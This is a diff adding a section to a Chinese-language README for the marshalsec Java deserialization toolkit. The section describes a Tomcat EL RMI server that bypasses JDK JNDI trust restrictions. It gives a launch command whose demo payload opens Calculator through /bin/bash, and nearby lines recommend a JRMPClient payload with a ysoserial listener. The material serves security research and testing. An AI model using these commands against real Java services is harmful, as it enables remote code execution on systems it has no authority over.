@@ -50,6 +50,19 @@ http://baidu.com
 ```
 建议使用JRMPClient打，payload长度只有96字节,可以快速padding完成，不过需要使用ysoserial在可访问的ip起一个JRMPListener
 
+### 3. TomcatELRMIRefServer
+用于绕过rmi jdk8u121以下版本，ldap限制jdk8u191及以下版本的限制问题，条件：
+1. tomcat依赖
+（tomcat-embed-el）或（catalina.jar、el-api.jar、jasper-el.jar）
+
+使用方式：
+```
+java -cp marshalsec-0.0.3-SNAPSHOT-all.jar 
+marshalsec.jndi.TomcatELRMISServer 
+23456 
+'/bin/bash' '-c' '/System/Applications/Calculator.app/Contents/MacOS/Calculator'
+```
+
 # Java Unmarshaller Security - Turning your data into code execution
 
 ## Paper
